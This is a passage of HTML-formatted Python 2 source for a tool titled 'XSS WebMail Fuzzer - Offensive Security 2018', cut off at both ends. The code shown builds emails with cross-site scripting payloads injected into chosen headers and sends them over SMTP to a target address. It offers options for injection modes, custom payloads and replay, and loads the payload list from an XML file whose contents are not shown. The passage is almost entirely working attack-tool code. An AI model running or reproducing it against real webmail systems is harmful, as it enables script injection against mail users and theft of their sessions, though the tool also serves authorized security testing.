/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"-injectedin-"</span>+h<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msg&nbsp;=&nbsp;tagHeaders(msg,&nbsp;mail_name)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendData(conn,&nbsp;username,&nbsp;password,&nbsp;frmemail,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dstemail,&nbsp;msg,&nbsp;mail_name)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;interactive:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;raw_input(<span style="color:#3ad900;font-weight:400">"[$]&nbsp;Press&nbsp;Enter&nbsp;to&nbsp;send&nbsp;next&nbsp;email..."</span>)<br /><br />def&nbsp;sendData(conn,&nbsp;username,&nbsp;password,&nbsp;frmemail,&nbsp;dstemail,&nbsp;msg,&nbsp;mail_name):<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"""&nbsp;Connect&nbsp;to&nbsp;SMTP&nbsp;Server&nbsp;and&nbsp;Send&nbsp;out&nbsp;our&nbsp;data&nbsp;"""</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[+]&nbsp;Sending&nbsp;email&nbsp;%s"</span>&nbsp;%&nbsp;mail_name<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">############</span><br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;conn&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">'ssl'</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;server&nbsp;=&nbsp;smtplib.SMTP_SSL(smtpsrv)<br />&nbsp;&nbsp;&nbsp;&nbsp;else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;server&nbsp;=&nbsp;smtplib.SMTP(smtpsrv)<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;conn&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">'tls'</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;server.starttls()<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;username&nbsp;and&nbsp;password:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;server.login(username,password)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#server.set_debuglevel(1)</span><br />&nbsp;&nbsp;&nbsp;&nbsp;try:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;server.sendmail(frmemail,&nbsp;dstemail,&nbsp;msg)<br />&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;<span style="color:#7f0044;font-weight:400">Exception</span>,&nbsp;e:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[-]&nbsp;Failed&nbsp;to&nbsp;send&nbsp;email:"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;"</span>&nbsp;+&nbsp;str(e)<br />&nbsp;&nbsp;&nbsp;&nbsp;server.quit()<br /><br />def&nbsp;showXSSPaylods(names,&nbsp;codes):<br />&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;name,&nbsp;code&nbsp;in&nbsp;zip(&nbsp;names,&nbsp;codes&nbsp;):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[$]&nbsp;Payload&nbsp;%d&nbsp;&nbsp;:&nbsp;%s"</span>&nbsp;%\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(names.index(name),&nbsp;getTextFromXML(name))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br /><br />def&nbsp;main():<br />&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;dstemail,&nbsp;frmemail,&nbsp;smtpsrv,&nbsp;username,&nbsp;password<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"\n##############################################################"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"######&nbsp;&nbsp;&nbsp;XSS&nbsp;WebMail&nbsp;Fuzzer&nbsp;-&nbsp;Offensive&nbsp;Security&nbsp;2018&nbsp;&nbsp;&nbsp;######"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"##############################################################\n"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;usage&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"%prog&nbsp;-t&nbsp;dest_email&nbsp;-f&nbsp;from_email&nbsp;-s&nbsp;smtpsrv:port&nbsp;[options]"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;parser&nbsp;=&nbsp;OptionParser(usage=usage)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(<span style="color:#3ad900;font-weight:400">"-t"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--to"</span>,&nbsp;type=<span style="color:#3ad900;font-weight:400">"string"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;action=<span style="color:#3ad900;font-weight:400">"store"</span>,&nbsp;dest=<span style="color:#3ad900;font-weight:400">"dstemail"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=<span style="color:#3ad900;font-weight:400">"Destination&nbsp;Email&nbsp;Address"</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(<span style="color:#3ad900;font-weight:400">"-f"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--from"</span>,&nbsp;type=<span style="color:#3ad900;font-weight:400">"string"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;action=<span style="color:#3ad900;font-weight:400">"store"</span>,&nbsp;dest=<span style="color:#3ad900;font-weight:400">"frmemail"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=<span style="color:#3ad900;font-weight:400">"From&nbsp;Email&nbsp;Address"</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(<span style="color:#3ad900;font-weight:400">"-s"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--smtp"</span>,&nbsp;type=<span style="color:#3ad900;font-weight:400">"string"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;action=<span style="color:#3ad900;font-weight:400">"store"</span>,&nbsp;dest=<span style="color:#3ad900;font-weight:400">"smtpsrv"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=<span style="color:#3ad900;font-weight:400">"SMTP&nbsp;Server"</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(<span style="color:#3ad900;font-weight:400">"-c"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--conn"</span>,&nbsp;type=<span style="color:#3ad900;font-weight:400">"string"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;action=<span style="color:#3ad900;font-weight:400">"store"</span>,&nbsp;dest=<span style="color:#3ad900;font-weight:400">"conn"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=<span style="color:#3ad900;font-weight:400">"SMTP&nbsp;Connection&nbsp;type&nbsp;(plain,ssl,tls"</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(<span style="color:#3ad900;font-weight:400">"-u"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--user"</span>,&nbsp;type=<span style="color:#3ad900;font-weight:400">"string"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;action=<span style="color:#3ad900;font-weight:400">"store"</span>,&nbsp;dest=<span style="color:#3ad900;font-weight:400">"username"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=<span style="color:#3ad900;font-weight:400">"SMTP&nbsp;Username&nbsp;(optional)"</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(<span style="color:#3ad900;font-weight:400">"-p"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--password"</span>,&nbsp;type=<span style="color:#3ad900;font-weight:400">"string"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;action=<span style="color:#3ad900;font-weight:400">"store"</span>,&nbsp;dest=<span style="color:#3ad900;font-weight:400">"password"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=<span style="color:#3ad900;font-weight:400">"SMTP&nbsp;Password&nbsp;(optional)"</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(<span style="color:#3ad900;font-weight:400">"-l"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--localfile"</span>,&nbsp;type=<span style="color:#3ad900;font-weight:400">"string"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;action=<span style="color:#3ad900;font-weight:400">"store"</span>,&nbsp;dest=<span style="color:#3ad900;font-weight:400">"filename"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=<span style="color:#3ad900;font-weight:400">"Local&nbsp;XML&nbsp;file"</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(<span style="color:#3ad900;font-weight:400">"-r"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--replay"</span>,&nbsp;type=<span style="color:#3ad900;font-weight:400">"int"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;action=<span style="color:#3ad900;font-weight:400">"store"</span>,&nbsp;dest=<span style="color:#3ad900;font-weight:400">"replay"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=<span style="color:#3ad900;font-weight:400">"Replay&nbsp;payload&nbsp;number"</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(<span style="color:#3ad900;font-weight:400">"-P"</span>,&nbsp;action=<span style="color:#3ad900;font-weight:400">"store_true"</span>,&nbsp;dest=<span style="color:#3ad900;font-weight:400">"custompayload"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=<span style="color:#3ad900;font-weight:400">"Replace&nbsp;default&nbsp;js&nbsp;alert&nbsp;with&nbsp;a&nbsp;custom&nbsp;payload"</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(<span style="color:#3ad900;font-weight:400">"-j"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--injection-type"</span>,&nbsp;type=<span style="color:#3ad900;font-weight:400">"choice"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;choices=[<span style="color:#3ad900;font-weight:400">"basic_main"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"basic_extra"</span>,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"pinpoint"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"onebyone_main"</span>,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"onebyone_extra"</span>&nbsp;],<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;action=<span style="color:#3ad900;font-weight:400">"store"</span>,&nbsp;dest=<span style="color:#3ad900;font-weight:400">"injection"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=<span style="color:#3ad900;font-weight:400">"Available&nbsp;injection&nbsp;methods:\n"</span>&nbsp;+\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"basic_main,&nbsp;basic_extra,&nbsp;pinpoint,&nbsp;"</span>&nbsp;+\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"onebyone_main,&nbsp;onebyone_extra\n"</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(<span style="color:#3ad900;font-weight:400">"-F"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"--injection-field"</span>,&nbsp;type=<span style="color:#3ad900;font-weight:400">"choice"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;choices=EMAIL_HEADERS,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;action=<span style="color:#3ad900;font-weight:400">"store"</span>,&nbsp;dest=<span style="color:#3ad900;font-weight:400">"pinpoint_field"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=<span style="color:#3ad900;font-weight:400">"This&nbsp;option&nbsp;must&nbsp;be&nbsp;used&nbsp;together&nbsp;with&nbsp;-j&nbsp;in&nbsp;"</span>+\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"to&nbsp;specify&nbsp;the&nbsp;E-Mail&nbsp;header&nbsp;to&nbsp;pinpoint.&nbsp;See&nbsp;the&nbsp;"</span>+\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"EMAIL_HEADERS&nbsp;global&nbsp;variable&nbsp;in&nbsp;the&nbsp;source&nbsp;to&nbsp;"</span>&nbsp;+\<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"obtain&nbsp;a&nbsp;list&nbsp;of&nbsp;possible&nbsp;fields"</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(<span style="color:#3ad900;font-weight:400">"-I"</span>,&nbsp;action=<span style="color:#3ad900;font-weight:400">"store_true"</span>,&nbsp;dest=<span style="color:#3ad900;font-weight:400">"interactive"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=<span style="color:#3ad900;font-weight:400">"Run&nbsp;onebyone&nbsp;injections&nbsp;in&nbsp;interactive&nbsp;mode"</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(<span style="color:#3ad900;font-weight:400">"-L"</span>,&nbsp;action=<span style="color:#3ad900;font-weight:400">"store_true"</span>,&nbsp;dest=<span style="color:#3ad900;font-weight:400">"listmode"</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=<span style="color:#3ad900;font-weight:400">"Load&nbsp;XML&nbsp;file&nbsp;and&nbsp;show&nbsp;available&nbsp;XSS&nbsp;payloads"</span>)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;(options,&nbsp;args)&nbsp;=&nbsp;parser.parse_args()<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Setting&nbsp;default&nbsp;values&nbsp;&nbsp;&nbsp;&nbsp;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;conn&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"plain"</span><br />&nbsp;&nbsp;&nbsp;&nbsp;username&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:700">None</span><br />&nbsp;&nbsp;&nbsp;&nbsp;password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:700">None</span><br />&nbsp;&nbsp;&nbsp;&nbsp;filename&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:700">None</span><br />&nbsp;&nbsp;&nbsp;&nbsp;replay&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:700">None</span><br />&nbsp;&nbsp;&nbsp;&nbsp;custompayload&nbsp;&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:700">None</span><br />&nbsp;&nbsp;&nbsp;&nbsp;injection&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:700">None</span><br />&nbsp;&nbsp;&nbsp;&nbsp;pinpoint_field&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:700">None</span><br />&nbsp;&nbsp;&nbsp;&nbsp;interactive&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:700">None</span><br />&nbsp;&nbsp;&nbsp;&nbsp;listmode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:700">None</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Parsing&nbsp;options</span><br />&nbsp;&nbsp;&nbsp;&nbsp;dstemail&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;options.dstemail<br />&nbsp;&nbsp;&nbsp;&nbsp;frmemail&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;options.frmemail<br />&nbsp;&nbsp;&nbsp;&nbsp;smtpsrv&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;options.smtpsrv<br />&nbsp;&nbsp;&nbsp;&nbsp;conn&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;options.conn<br />&nbsp;&nbsp;&nbsp;&nbsp;username&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;options.username<br />&nbsp;&nbsp;&nbsp;&nbsp;password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;options.password<br />&nbsp;&nbsp;&nbsp;&nbsp;filename&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;options.filename<br />&nbsp;&nbsp;&nbsp;&nbsp;replay&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;options.replay<br />&nbsp;&nbsp;&nbsp;&nbsp;custompayload&nbsp;&nbsp;=&nbsp;options.custompayload<br />&nbsp;&nbsp;&nbsp;&nbsp;injection&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;options.injection<br />&nbsp;&nbsp;&nbsp;&nbsp;pinpoint_field&nbsp;=&nbsp;options.pinpoint_field<br />&nbsp;&nbsp;&nbsp;&nbsp;interactive&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;options.interactive<br />&nbsp;&nbsp;&nbsp;&nbsp;listmode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;options.listmode<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;(dstemail&nbsp;and&nbsp;frmemail&nbsp;and&nbsp;smtpsrv)&nbsp;and&nbsp;not&nbsp;listmode:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;listmode<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parser.print_help()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;injection&nbsp;==&nbsp;<span style="color:#3ad900;font-weight:400">"pinpoint"</span>&nbsp;and&nbsp;not&nbsp;pinpoint_field:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parser.print_help()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()<br />&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;not&nbsp;injection:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;injection&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"basic_main"</span><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;If&nbsp;the&nbsp;default&nbsp;file&nbsp;is&nbsp;there&nbsp;using&nbsp;it&nbsp;instead</span><br />&nbsp;&nbsp;&nbsp;&nbsp;try:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os.stat(DEFAULT_XML)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filename&nbsp;=&nbsp;DEFAULT_XML<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[*]&nbsp;Using&nbsp;local&nbsp;xml&nbsp;file..."</span><br />&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;<span style="color:#7f0044;font-weight:400">OSError</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pass<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Fetch&nbsp;XML&nbsp;file&nbsp;from&nbsp;the&nbsp;web</span><br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;filename:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xmldata&nbsp;=&nbsp;fetchXML()<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;Parse&nbsp;Local&nbsp;XML&nbsp;file</span><br />&nbsp;&nbsp;&nbsp;&nbsp;else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fp&nbsp;=&nbsp;open(filename,<span style="color:#3ad900;font-weight:400">"r"</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xmldata&nbsp;=&nbsp;fp.read()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;<span style="color:#7f0044;font-weight:400">IOError</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"[-]&nbsp;Could&nbsp;not&nbsp;open&nbsp;file&nbsp;"</span>&nbsp;+&nbsp;filename&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()<br />&nbsp;&nbsp;&nbsp;&nbsp;names,&nbsp;codes&nbsp;=&nbsp;parseXML(xmldata)[<span style="color:#ff0044;font-weight:400">0</span>],&nbsp;parseXML(xmldata)[<span style="color:#ff0044;font-weight:400">1</span>]<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;listmode:<br 